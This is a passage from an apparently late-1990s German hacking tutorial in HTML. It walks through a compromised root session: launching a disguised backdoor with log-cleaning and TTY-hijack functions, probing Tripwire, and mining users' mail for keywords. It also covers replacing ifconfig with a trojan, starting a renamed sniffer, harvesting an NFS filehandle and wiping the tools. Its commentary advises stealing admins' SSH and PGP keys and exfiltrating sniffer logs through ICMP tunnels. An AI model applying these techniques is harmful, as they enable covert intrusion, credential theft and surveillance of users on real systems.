+<br><font color="#FF0000">bash# mv smeagol "netstat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"</font>
+<br><font color="#FF0000">bash# ./netstat*</font>
+<br><font color="#FF0000">LOCK&lt;-KEY:</font>
+<br><font color="#FF0000">bash# telnet</font>
+<br><font color="#FF0000">telnet> o localhost 1524</font>
+<br><font color="#FF0000">Trying 127.0.0.1...</font>
+<br><font color="#FF0000">Connected to localhost.</font>
+<br><font color="#FF0000">Escape character is '^]'.</font>
+<p><font color="#FF0000">hixer</font>
+<p><font color="#FF0000"><font size=+4>WELCOME</font></font>
+<br><font color="#FF0000"><font size=+4>CYBERSPAWN</font></font>
+<br>&nbsp;
+<p><font color="#FF0000">[/] Simon says: helpme</font>
+<br><font color="#FF0000">bye&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+:&nbsp; close Session</font>
+<br><font color="#FF0000">remove &lt;user>&nbsp;&nbsp;&nbsp;&nbsp; :&nbsp;
+starts Simple Nomad's LogCleaner</font>
+<br><font color="#FF0000">maskas &lt;user>&nbsp;&nbsp;&nbsp; :&nbsp;&nbsp;
+mask Process with EUID of &lt;user></font>
+<br><font color="#FF0000">cd &lt;direc>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+:&nbsp; make a chdir() call</font>
+<br><font color="#FF0000">ttyhij &lt;tty>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+:&nbsp; hijack a TTY session</font>
+<br><font color="#FF0000">accth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+:&nbsp; Start Zhart's Acct Handler (not available)</font>
+<br><font color="#FF0000">helpme&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+:&nbsp; You guessed it right...</font>
+<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Smeagol was written by</font>
+<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+TICK</font>
+<br>&nbsp;
+<p><font color="#FF0000">[/] Simon says: bye</font>
+<br><font color="#FF0000">Bye</font>
+<br>&nbsp;
+<p><font color="#FF0000">Connection closed by foreign host.</font>
+<br><font color="#FF0000">bash#</font>
+<p><font color="#000000">Um uns den Remote-Zugang zum System zu erhalten
+benutzen wir einen Backdoor-Server.</font>
+<br><font color="#000000">Falls ich einen Backdoor-Server verwende benutze
+ich meinen eigenen. </font>Smeagol&nbsp; ist sehr gut darin seine Existenz
+<br>zu verschleiern aber leider laeuft er bisher nur auf AIX und Linux.
+Fuer andere Systeme koennen z.B. simple Perl-Backdoors benutzt werden oder
+portiere Smeagol einfach zu 'nem anderen Unix-Derivat und sende mir dann
+bitte deine Version.
+<br>Nunja, am Betsen ist es natuerlich ein Backdoor-LKM zu verwenden, aber
+es ist schwer an die noetigen Informationen fuer die verschieden Unix-Abkoemmlinge
+zu gelangen - frag' mal in den News rum.
+<br>Es ist sehr wichtig, dass du vor der Installation den genauen Pfad
+zu den Logfiles, das Passwort und die richtigen Namen fuer die Daemons,
+fuer die sich Smeagol ausgeben soll, angibst. Falls auf dem System das
+<i>Process-Accounting
+</i>aktiviert
+worden ist musst du auch dafuer die entsprechenden Aenderungen im Source-Code
+und im Makefile machen.
+<br>Zum Aendern der verschluesselten Strings solltest du <b>convert</b>
+benutzen. Als XOR-Value (F1) musst du den Default-XOR-Wert angeben, der
+als Define in 'strhide.h' verwendet wird. Der Output muss gefixt werden
+(F3).
+<br>Ich habe Smeagol nach <font color="#000000">"netstat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+" ge'movet um argv[0] gross genug zu machen, damit beim Ueberschreiben
+der Process-Tableeintraege nicht die hinteren Buchstaben abgeschnitten
+werden, und desweiteren sieht der Aufruf von <b>netstat</b> ungefaehrlicher
+aus als der Aufruf von <b>smeagol </b>- spez. beim Proc-Acct.</font>
+<p><font color="#FF0000">bash# cd /var/cron/tabs</font>
+<br><font color="#FF0000">bash# ls -al</font>
+<br><font color="#FF0000">&nbsp;total 3</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 25 11:56
+./</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 3 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 May 28 20:57
+../</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 258 Jan 25 11:56
+root</font>
+<br><font color="#FF0000">bash# cat root</font>
+<br><font color="#FF0000"># DO NOT EDIT THIS FILE - edit the master and
+reinstall.</font>
+<br><font color="#FF0000"># (/tmp/crontab.326 installed on Sat Jul 25 11:56:24
+1998)</font>
+<br><font color="#FF0000"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17
+03:20:37 vixie Exp $)</font>
+<br><font color="#FF0000">#</font>
+<br><font color="#FF0000"># run Tripwire at 3.00 pm every day</font>
+<br><font color="#FF0000">00 15 * * * (/root/bin/runtw)</font>
+<br><font color="#FF0000">bash# cd /root/bin</font>
+<br><font color="#FF0000">bash# file runtw</font>
+<br><font color="#FF0000">runtw: Bourne shell script text</font>
+<br><font color="#FF0000">bash# cat runtw</font>
+<br><font color="#FF0000">#!/bin/sh</font>
+<br><font color="#FF0000">/bin/mount -r -t ext2 -v /dev/fd0 /fd0/tripwire
+|| exit 1</font>
+<br><font color="#FF0000">/fd0/tripwire/bin/tripwire</font>
+<br><font color="#FF0000">/bin/umount /dev/fd0</font>
+<p><font color="#FF0000">exit 0</font>
+<br><font color="#FF0000">bash# mount -t ext2 /dev/fd0 /mnt</font>
+<br><font color="#FF0000">mount: block device /dev/fd0 is write-protected,
+mounting read-only</font>
+<br><font color="#FF0000">/dev/fd0 on /mnt type ext2 (ro)</font>
+<br><font color="#FF0000">bash# cd /mash# cd /mnt</font>
+<br><font color="#FF0000">bash# ls -al</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 5 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 29&nbsp;
+1997 .</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 4 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 29&nbsp;
+1997 ..</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:40
+Config</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:34
+Databases</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:57
+bin</font>
+<br><font color="#FF0000">bash# ls -alR .</font>
+<br><font color="#FF0000">total 5</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 5 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 29&nbsp;
+1997 .</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 4 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 29&nbsp;
+1997 ..</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:40
+Config</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:34
+Databases</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:57
+bin</font>
+<p><font color="#FF0000">Config:</font>
+<br><font color="#FF0000">total 4</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:40
+.</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 5 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 29&nbsp;
+1997 ..</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 387 Jul 23 13:34
+tw.config</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 387 Jul 23 13:40
+tw.config.bak</font>
+<p><font color="#FF0000">Databases:</font>
+<br><font color="#FF0000">total 2</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:34
+.</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 5 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 29&nbsp;
+1997 ..</font>
+<p><font color="#FF0000">bin:</font>
+<br><font color="#FF0000">total 425</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 23 13:57
+.</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 5 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jul 29&nbsp;
+1997 ..</font>
+<br><font color="#FF0000">-rwxr-xr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 128745 Jul 23 13:45 tripwire</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 299814 Jul 29&nbsp; 1997 tripwire-1.2.tar.gz</font>
+<br><font color="#FF0000">bash# cd Config</font>
+<br><font color="#FF0000">bash# cat tw.config</font>
+<br><font color="#FF0000"># Check root's binaries</font>
+<br><font color="#FF0000">/root/bin</font>
+<p><font color="#FF0000"># Check TripWire's Database-, Config- and TAR-File</font>
+<br><font color="#FF0000">/fd0/tripwire</font>
+<p><font color="#FF0000"># Check System-Files and -Binaries</font>
+<br><font color="#FF0000">/etc/passwd</font>
+<br><font color="#FF0000">/etc/skel</font>
+<br><font color="#FF0000">/etc/aliases</font>
+<br><font color="#FF0000">/etc/exports</font>
+<br><font color="#FF0000">/etc/fstab</font>
+<br><font color="#FF0000">/etc/ftpusers</font>
+<br><font color="#FF0000">/etc/group</font>
+<br><font color="#FF0000">/etc/hosts</font>
+<br><font color="#FF0000">/etc/inetd.conf</font>
+<br><font color="#FF0000">/etc/inittab</font>
+<br><font color="#FF0000">/etc/lilo.conf</font>
+<br><font color="#FF0000">/etc/profile</font>
+<br><font color="#FF0000">/etc/sendmail.cf</font>
+<br><font color="#FF0000">/etc/sudoers</font>
+<br><font color="#FF0000">/etc/syslog.conf</font>
+<br><font color="#FF0000">/bin</font>
+<br><font color="#FF0000">/usr/bin</font>
+<br><font color="#FF0000">/usr/local/bin</font>
+<br><font color="#FF0000">bash#</font>
+<p><font color="#000000">Bevor wir irgendwelche Files ersetzen oder aendern
+sollten wir ueberpruefen ob die Admins einen Integry-Checker zum Schutz
+vor Trojan-Horses etc. einsetzen. Auf diesem Rechner ist das der Fall.
+Grundsaetzlich kann ich nur sagen, dass du niemals so sicherheitsrelevante
+Files, wie z.B. '/etc/passwd' oder '/etc/inetd.conf', veraendern solltest;
+egal wie clever du vorgehst, die Admins werden es immer entdecken und meistens
+eher frueher als spaeter. Dasselbe gilt fuer SUID-Shells. Ich kann auch
+nur davon abraten die Tripwire-DB zu manipulieren, was in diesem Fall auch
+garnicht moeglich ist, da sich die DB auf 'ner write-protected Floppy befindet.</font>
+<br><font color="#000000">Natuerlich koenntest du fuer Linux die weit verbreiteten
+Loadable-Kernel-Modules (LKMs) verwenden um die Syscalls zu verbiegen,
+damit du dein Trojan-Horse in den Kernel verlegst, oder spez. fuer Tripwire,
+die Zugriffe auf die geschuetzten Files manipulierst. Ich halte solche
+Eingriffe in das System fuer zu Aufwendig und folglich Auffaellig. Was
+mir hingegen gefaellt sind gute LKMs, die die Praesenz von bestimmten Dingen,
+wie Files, User, LKMs etc, verbergen. Mit soeinem 'Hide-LKM' ist es dann
+auch moeglich SUID-Shell im System zu verschtecken.</font>
+<p><font color="#FF0000">bash# cd /tmp/".. "</font>
+<br><font color="#FF0000">bash# cat > wl.mail</font>
+<br><font color="#FF0000">hacker</font>
+<br><font color="#FF0000">cracker</font>
+<br><font color="#FF0000">intrusion</font>
+<br><font color="#FF0000">security</font>
+<br><font color="#FF0000">break-in</font>
+<br><font color="#FF0000">hack</font>
+<br><font color="#FF0000">password</font>
+<br><font color="#FF0000">login</font>
+<br><font color="#FF0000">account</font>
+<br><font color="#FF0000">tripwire</font>
+<br><font color="#FF0000">integry</font>
+<br><font color="#FF0000">sniffer</font>
+<br><font color="#FF0000">cpm</font>
+<br><font color="#FF0000">ifconfig</font>
+<br><font color="#FF0000">military</font>
+<br><font color="#FF0000">.ml</font>
+<br><font color="#FF0000">.gov</font>
+<br><font color="#FF0000">^C</font>
+<br><font color="#FF0000">bash# cat > wl.log</font>
+<br><font color="#FF0000">source.ass</font>
+<br><font color="#FF0000">johnny</font>
+<br><font color="#FF0000">^C</font>
+<br><font color="#FF0000">bash# ./searcher -vvv -rnf -m wl.mail -l wl.log
+> s.res &amp;</font>
+<br><font color="#FF0000">[1] 454</font>
+<br><font color="#FF0000">bash#</font>
+<p>Searcher&nbsp; sucht nun nach den angegeben Wortern in den E-Mails der
+User bzw. in den Syslog-Files (doppelt haelt besser) und zuseatzlich verschafft
+es uns weitere Informationen, die uns den Zugang zu anderen Systemen ermoeglichen
+koennen.
+<br>Searcher ist auch sehr nuetzlich, wenn du Informationen ueber ganz
+bestimmte Sachen suchst, z.B. ueber irgendwelche Forschungs-Projekte, die
+sich natuerlich mit Internet-Security &amp; Co. beschaeftigen, oder wenn
+du Daten ueber deine Noten im Verwaltungs-Server deiner Uni suchst ;).
+Um die Suche etwas zu beschleunigen kannst du dich nur auf ausgewaehlte
+Gruppen von Usern beschraenken.
+<br>Am besten ist es wenn du Searcher schon frueh startest, da er viel
+Zeit benoetigt.
+<br>Das Resultat von Searcher's Arbeit kannst du am besten mit 'gzip --best'
+komprimieren, mit 'uuencode' ausgeben lassen und nach dem Hack aus deinen
+Logs extrahieren um es zu analysieren.
+<p>Jetzt ist der richtige Zeitpunkt gekommen um sich um die Admins zu kuemmern.
+<br>Du solltest dir von jedem Admin das Home-Direc. angucken, dein Augenmerk
+sollte dabei auf das Bin-Direc. und das History-File fallen (SSH-, PGP-Keys
+und .Xauthority Files solltest du dir als Bonus mitnehmen). Du wirst mit
+Sicherheit weitere Securitytools, wie z.B. <b>cpm</b> (<i>Promiscuous-Mode</i>
+Checker), finden, und das History-File gibt dir Auskunft ueber das Verhalten
+der Admins, z.B.: auf welchen Rechner sie arbeiten, ob sie das root-Passwort
+kennen, welche Befehle sie ausfuehren und demnach welche Aufgaben sie haben.
+<br>Wenn Admins haeufig <b>su</b> ausfuehren und dabei nicht den vollen
+Path angeben sind sie ein perfektes Ziel fuer spaetere PATH/Trojan-Horse
+Attacken.
+<p><font color="#FF0000">bash# which ifconfig</font>
+<br><font color="#FF0000">/sbin/ifconfig</font>
+<br><font color="#FF0000">bash# cd /tmp/".. "</font>
+<br><font color="#FF0000">bash# fix /sbin/ifconfig ./ifconfig ./ic.bak</font>
+<br><font color="#FF0000">fixer: Last 17 bytes not zero</font>
+<br><font color="#FF0000">fixer: Can't fix checksum</font>
+<br><font color="#FF0000">bash# showmount -e localhost</font>
+<br><font color="#FF0000">/cdrom&nbsp; pc-01.pool.domain.com</font>
+<br><font color="#FF0000">bash# mv linsniffer nfsiod</font>
+<br><font color="#FF0000">bash# export PATH=.:$PATH</font>
+<br><font color="#FF0000">bash# nfsiod</font>
+<p><font color="#000000">Als letztes installieren wir noch unseren <i>Ethernet-Sniffer</i>.
+Wir ersetzen <b>ifconfig</b> mit einer modifizierten Version, die nicht
+anzeigt ob eine Netzwerkarte in den <i>Promiscuous-Mode </i>geschalltet
+ist. Falls ein Admin <b>cpm</b> o.ae. benutzt, solltest du es ebenfalls
+ersetzen - aber denke immer an Integry-Checker, in diesem Fall ist '/sbin'
+nicht Teil der Tripwire-DB. Auf hochsicheren Rechnern wuerde ich niemals
+Prog.s ersetzen, da die Wahrscheinlichkeit hoch ist, dass sich doch irgendwo
+ein Integry-Checker verbirgt, den man uebersehen hat (im Fall des Sniffers
+waere es denkbar ein LKM in den Kernel zu laden um den <i>ioctl()</i> Systemcall
+zu verbiegen und das PROMISC Flag nicht mehr anzuzeigen).</font>
+<br><font color="#000000">Frueher wurde haeufig das Prog. <b>sum</b> fuer
+die Checksum-Erstellung benutzt, leider (?) erstellt <b>sum</b> kryptographisch
+unsichere Hashwerte. Das Tool <b>fix</b>/<b>fixer</b> nutzt diesen 'Fehler'
+aus, ich habe es hier nur verwendet, weil es die Zeiten anpasst und ein
+Backup erstellt. Da <b>sum</b> so gut wie garnicht mehr benutzt wird ist
+es auch nicht wichtig, dass die Checksum nicht gefixt wurde, falls du es
+aber doch besser findest, dann haenge einfach ein paar Nullen an dein Trojan-Horse
+undzwar wie folgt</font>
+<br><font color="#FF0000">bash# cat /dev/zero >> ./ifconfig</font>
+<br><font color="#FF0000">^C</font>
+<br><font color="#000000">Anschliesend starten wir den Sniffer nachdem
+wir ihm einen unauffaelligen Namen verpasst haben. Wenn der Admin irgendein
+Verzeichnis exportiert, das jedermann mounten kann, dann solltest du dein
+Snifflog-File dorthin schreiben lassen. Aber ich bevorzuge die </font>Collector-Library&nbsp;
+oder noch besser, insbesondere bei Firewalls, die&nbsp; ICMP-Tunnel-Library
+.
+<br>Kleine Anekdote: Ich hab' mal 'ne Zeit lang meine Snifferlogs via ICMP-Tunnel
+von 'nem Bastion-Host zu 'nem auslaendischen Rechner 'geschmuggelt'; es
+funktionierte wunderbar und wurde nicht endeckt.
+<p><font color="#FF0000">bash# mount</font>
+<br><font color="#FF0000">/dev/hda4 on / type ext2 (rw)</font>
+<br><font color="#FF0000">proc on /proc type proc (rw)</font>
+<br><font color="#FF0000">/dev/hda1 on /dos type msdos (rw)</font>
+<br><font color="#FF0000">/dev/hda2 on /tmp type ext2 (rw)</font>
+<br><font color="#FF0000">nfsserver:/nfs_mnt/usr on /usr type nfs (ro,intr,addr=10.255.0.34)</font>
+<p><font color="#FF0000">bash# showmount -e nfsserver</font>
+<br><font color="#FF0000">Export list for nfsserver:</font>
+<br><font color="#FF0000">/nfs_mnt/usr victim.domain.com</font>
+<br><font color="#FF0000">[...]</font>
+<p><font color="#FF0000">bash# askhandle nfsserver /nfs_mnt/usr > nfsserver-nfs_mnt.filehandle</font>
+<br><font color="#FF0000">bash# cat nfsserver-nfs*</font>
+<br><font color="#FF0000">nfsserver /nfs_mnt 1e 91 13 52 01 50 00 00 02
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</font>
+<p>Jetzt, wo wir root Rechte besitzen koennen wir uns weitere Informationen
+beschaffen, die uns den Weg zurueck ins Netz ermoeglichen koennen. Was
+hier etwas kryptisch aussieht ist nichts weiter als das NFS-Filehandle
+fuer das Verzeichnis <font color="#33FF33">/nfs_mnt</font> des NFS-Servers
+nfsserver. Mit Hilfe dieser Zahlenfolge und eines netten Programms namens
+<b>nfsmenu</b>
+ist es uns nun moeglich das Directory <font color="#33FF33">/nfs_mnt</font>
+von ueberallher zu mounten.
+<p><font color="#FF0000">bash# cd /tmp/".. "</font>
+<br><font color="#FF0000">[1]+&nbsp; Done&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+searcher</font>
+<br><font color="#FF0000">bash# gzip --best s.res</font>
+<br><font color="#FF0000">bash# uuencode s.res.gz s.res.gz</font>
+<br><font color="#FF0000">[...]</font>
+<br><font color="#FF0000">bash# gcc -o rm srm.c</font>
+<br><font color="#FF0000">bash# rm -vss ./*</font>
+<br><font color="#FF0000">Deleting ifconfig *************************************
+Done</font>
+<br><font color="#FF0000">[...]</font>
+<br><font color="#FF0000">bash# cd ..</font>
+<br><font color="#FF0000">bash# rm -r ".. "</font>
+<br><font color="#FF0000">bash# ls -altr ~root</font>
+<br><font color="#FF0000">[...]</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 90803 Jan 23 11:26 .fvwm2rc</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 3 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2048 Jan 23 13:57
+bin</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp; 22 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jan 25 11:55
+..</font>
+<br><font color="#FF0000">drwx--x--x&nbsp; 35 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4096 Jan 26 09:11
+.</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 150 Jan 26 09:11
+.Xauthority</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 280 Jan 26 09:12
+.xsession-errors</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 5 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jan 26 09:17
+.netscape</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 441 Jun 5 13:14
+.bash_history</font>
+<br><font color="#FF0000">-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 85 Jan
+5 13:50 .xlockmessage</font>
+<br><font color="#FF0000">bash# exit</font>
+<br><font color="#FF0000">victim% cd</font>
+<br><font color="#FF0000">victim% pwd</font>
+<br><font color="#FF0000">/home/johnny</font>
+<br><font color="#FF0000">victim% ls -altr</font>
+<br><font color="#FF0000">[...]</font>
+<br><font color="#FF0000">-rw-r--r--&nbsp;&nbsp; 1 test&nbsp;&nbsp;&nbsp;&nbsp;
+users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3324 Dec 11&nbsp; 1997
+.emacs</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 test&nbsp;&nbsp;&nbsp;&nbsp;
+users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 May 28 20:57 .grok</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 2 test&nbsp;&nbsp;&nbsp;&nbsp;
+users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 May 28 20:57 .hotjava</font>
+<br><font color="#FF0000">drwx------&nbsp;&nbsp; 2 test&nbsp;&nbsp;&nbsp;&nbsp;
+users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 May 28 20:57 .seyon</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 2 test&nbsp;&nbsp;&nbsp;&nbsp;
+users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 May 28 20:57 .xfm</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 5 root&nbsp;&nbsp;&nbsp;&nbsp;
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jun 6 19:15 ..</font>
+<br><font color="#FF0000">drwxr-xr-x&nbsp;&nbsp; 6 test&nbsp;&nbsp;&nbsp;&nbsp;
+users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jun 6 19:15 .</font>
+<br><font color="#FF0000">victim% exit</font>
+<br><font color="#FF0000">exit</font>
+<br><font color="#FF0000">victim:/home/johhny > exit</font>
+<br><font color="#FF0000">logout</font>
+<br><font color="#FF0000">Connection closed by forign host.</font>
+<br><font color="#FF0000">source ></font>
+<p><font color="#000000">Zum Schluss wipen wir unsere Tools von der HD,
+damit sie nicht durch einfaches Raw-Reading oder&nbsp; <i>Magnetic Force
+Microscopy</i> (<i>MFM</i>) o. ae. wieder hergestellt werden koennen, und
+vergewissern uns, dass wir in den Home-Direc., in denen wir rumgewurschtelt
